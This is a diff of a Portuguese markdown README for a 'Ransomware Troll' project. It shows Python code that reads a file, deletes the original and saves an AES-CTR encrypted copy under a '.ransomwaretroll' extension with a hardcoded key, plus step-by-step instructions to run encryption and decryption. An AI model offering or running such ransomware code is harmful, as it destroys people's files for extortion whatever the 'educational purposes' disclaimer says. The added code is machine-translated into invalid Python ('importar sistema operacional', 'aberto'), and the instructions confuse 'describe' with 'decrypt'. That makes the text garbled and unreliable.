@@ -42,44 +42,62 @@ novo_arquivo.fechar()
 # Código de Criptografia
 Aqui está o código base que pode ser usado para criptografar arquivos usando o Ransomware Troll:
 
-import os
+``` pitão
+importar sistema operacional
+importar pyaes
 
-import pyaes
+# Nome do arquivo a ser criptografado
+nome_do_arquivo =  " arquivo.txt "
 
-*Nome do arquivo a ser criptografado*
+# Abre o arquivo em modo de leitura binária
+arquivo  =  aberto (nome_do_arquivo, " rb " )
+file_data =  arquivo .read()
+arquivo .close()
 
-file_name = "arquivo.txt"
+# Remover o arquivo original
+os.remove(nome_do_arquivo)
 
-*Abrir o arquivo em modo de leitura binária*
+# Chave para criptografia
+chave =  b " testeransomwares "
+aes = pyaes.AESModeOfOperationCTR(chave)
 
-file = open(file_name, "rb")
+# Realizar a criptografia
+crypto_data = aes.encrypt(dados_do_arquivo)
 
-file_data = file.read()
-
-file.close()
-
-*Remover o arquivo original*
-
-os.remove(file_name)
-
-*Chave para criptografia*
-
-key = b"testeransomwares"
-
-aes = pyaes.AESModeOfOperationCTR(key)
-
-*Realizar a criptografia*
-
-crypto_data = aes.encrypt(file_data)
-
-*Nome do novo arquivo criptografado*
-
-new_file = file_name + ".ransomwaretroll"
-
-new_file = open(f'{new_file}', 'wb')
-
-new_file.write(crypto_data)
-
-new_file.close()
+#Nome do novo arquivo criptografado
+novo_arquivo = nome_do_arquivo +  " .ransomwaretroll "
+novo_arquivo =  aberto ( f ' { novo_arquivo } ' , ' wb ' )
+novo_arquivo.escrever(dados_criptográficos)
+novo_arquivo.fechar()
+```
 
 -Se de substituir "arquivo.txt"pelo nome do arquivo que você deseja criptografar e"testeransomwares" pela chave correta de criptografia. O código criptografado será o arquivo selecionado e salvará uma versão criptografada com a extensão `.ransom
+
+
+## Instruções
+
+Para descrever um arquivo afetado pelo Ransomware Troll, siga estas etapas:
+
+1 . Verifique se você tem o Python instalado em seu sistema.
+
+2 . Instale a biblioteca ` pyaes` usando o comando ` pip install pyaes` .
+
+3 . Copie o código de descrição fornecido acima e cole-o em um novo arquivo Python.
+
+4 . Abra o arquivo Python em um editor de texto e modifique a linha ` file_name = "arquivo.txt.ransomwaretroll" ` para corresponder ao nome do arquivo criptografado que você deseja descrever.
+
+5 . Verifique se a chave correta de descritiva está definida na linha ` key = b"testeransomwares" ` . Se o fornecedor tiver fornecido uma chave diferente, atualize-a aqui.
+
+6 . Salve o arquivo Python com um nome adequado, por exemplo, ` descriptografar.py ` .
+
+7 . Abra o terminal ou prompt de comando e navegue até o diretório onde você salvou o arquivo Python.
+
+8 . Execute o arquivo Python escrevendo o seguinte comando: ` python descriptografar.py ` .
+
+9 . O código descreverá o arquivo e removerá o arquivo criptografado original.
+
+10 . Verifique se o arquivo descrito foi criado corretamente.
+
+Para criptografar um arquivo usando o Ransomware Troll, siga as mesmas etapas de 1 a 7 acima, mas substitua o código de descrição pelo código de criptografia fornecido. Certifique-se de fornecer o nome do arquivo que você deseja criptografar e a chave correta de criptografia. O arquivo criptografado será salvo com a extensão ` .ransomwaretroll ` .
+
+** Nota: ** Vale destacar que esta solução foi fornecida exclusivamente para fins educacionais e de pesquisa. Não incentivamos o uso de ransomware ou qualquer atividade ilegal. A descriptografia de arquivos criptografados por ransomware só é possível com a chave adequada. Recomendamos que, em caso de ataque, você busque a ajuda de profissionais especializados em segurança cibernética.
